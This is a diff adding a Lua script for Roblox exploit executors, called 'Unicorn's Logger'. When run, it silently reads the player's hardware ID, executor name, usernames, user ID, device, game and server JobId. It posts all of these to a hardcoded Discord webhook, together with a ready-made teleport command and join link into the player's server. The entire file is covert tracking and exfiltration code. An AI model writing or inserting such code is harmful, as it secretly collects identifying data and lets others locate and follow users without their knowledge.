@@ -1,0 +1,153 @@
+-- updated by mys (made secured and better)
+if getgenv().UnicornsLogLoader and getgenv().UnicornsLogDebug then
+	return
+end
+
+pcall(function()
+	getgenv().UnicornsLogLoader = true
+end)
+
+local MarketService = game:GetService("MarketplaceService");
+local InputService = game:GetService("UserInputService");
+local HttpService = game:GetService("HttpService");
+local Players = game:GetService("Players");
+local Player = Players.LocalPlayer
+local PlaceId = game.PlaceId
+local JobId = game.JobId
+
+local Request = request or (http and http.request) or http_request or (fluxus and fluxus.request) or (syn and syn.request)
+
+local gethwid = gethwid()
+local BinBody = Request({Url = "https://user-agent.mysontop-co.workers.dev/", Method = "GET"}).Body
+local BinDecoded = HttpService:JSONDecode(BinBody)
+local BinAgent = BinDecoded["user-agent"]
+local CleanAgent = string.gsub(tostring(BinAgent), "/", " ")
+
+-- made by mys
+local executor_list = {
+    ["Potassium"] = "🍌 ",
+    ["Xeno"] = "🛸 ",
+    ["Solara"] = "🗑️ ",
+    ["Madium"] = "Ⓜ️ ",
+    ["Volt"] = "⚡ ",
+    ["Wave"] = "🌊 ",
+    ["Synapse Z"] = "💤 ",
+    ["Cosmic"] = "🌌 ",
+    ["Volcano"] = "🌋 ",
+    ["Velocity"] = "🏃‍♂️ ",
+    ["Bunni.fun"] = "🐰 ",
+    ["Delta"] = "📱 ",
+    ["Serotonin"] = "🩸 ",
+    ["MacSploit"] = "🍎 ",
+    ["Hydrogen"] = "💧 ",
+    ["YUB-X"] = "✖️ ",
+    ["eclipt"] = "🌙 ",
+}
+
+local function executoremoji(agent)
+    for name, emoji in pairs(executor_list) do
+        if string.find(string.lower(agent), string.lower(name), 1, true) then
+            return emoji, name
+        end
+    end
+    return "💉 ", agent
+end
+
+local emoji, name = executoremoji(CleanAgent)
+
+print(emoji .. " " .. CleanAgent .. " executor detected!")
+
+
+local DeviceNames = {
+    [Enum.Platform.Windows] = "Windows",
+    [Enum.Platform.OSX]     = "macOS",
+    [Enum.Platform.IOS]     = "iOS",
+    [Enum.Platform.Android] = "Android",
+    [Enum.Platform.UWP]     = "Windows (UWP)"
+}
+
+local GameId = MarketService:GetProductInfo(PlaceId).Name
+
+local Webhook = "https://discord.com/api/webhooks/1496147992082645062/_VQ1OWTHh_PGJuRWR_eEG19Uu0D9Mm-Vjaj0gSFxAVnyw5QnePCjgj-TT_VAJJAmC2DJ"
+
+function SendWebhook(HookColor, FieldInputs)
+	local DataTable = {
+		content = "",
+		embeds = {
+			{
+				title = "Unicorn's Logger",
+                url = "",
+                description = "[" .. GameId .. "]" .. "(" .. "https://roblox.com/games/" .. PlaceId .. ")",
+				type = "rich",
+				
+				color = tonumber(HookColor),
+				
+				thumbnail = {
+					url = string.format(
+						"https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=%d&size=150x150&format=Png&isCircular=false",
+						Player.UserId
+					)
+				},
+				
+				fields = FieldInputs,
+
+				footer = {
+					text = RealTime,
+					icon_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR9nl_EddmDZ7XfG8Hgwo1-gdHyyYp1AG2soA&s"
+				}
+			}
+		}
+	}
+
+	Request({
+		Url = Webhook,
+		Body = HttpService:JSONEncode(DataTable),
+		Method = "POST",
+		Headers = {
+			["content-type"] = "application/json"
+		}
+	})
+end
+
+SendWebhook(0xffffff, {
+	{
+		name = "Display Name",
+		value = "```" .. Player.DisplayName .. "```",
+		inline = true
+	},
+	{
+		name = "User Name",
+		value = "```" .. Player.Name .. "```",
+		inline = true
+	},
+	{
+		name = "User Id",
+		value = "```" .. tostring(Player.UserId) .. "```",
+		inline = true
+	},
+	{
+		name = "Executor",
+		value = "```" .. tostring(CleanAgent) .. "```",
+		inline = true
+	},
+    {
+		name = "Hwid",
+		value = "```" .. tostring(gethwid) .. "```",
+		inline = true
+	},
+    {
+		name = "Device",
+		value = "```" .. DeviceNames[InputService:GetPlatform()] .. "```",
+        inline = false
+	},
+	{
+		name = "Game",
+		value = "```lua\n" .. 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. PlaceId .. ", " .. '"' .. JobId .. '"' .. ", " .. 'game:GetService("Players").LocalPlayer)' .. "\n```",
+		inline = false
+	},
+    {
+		name = "Join Link",
+		value = "https://www.roblox.com/games/start?placeId=" .. PlaceId .. "&jobId=" .. JobId,
+		inline = false
+	}
+})
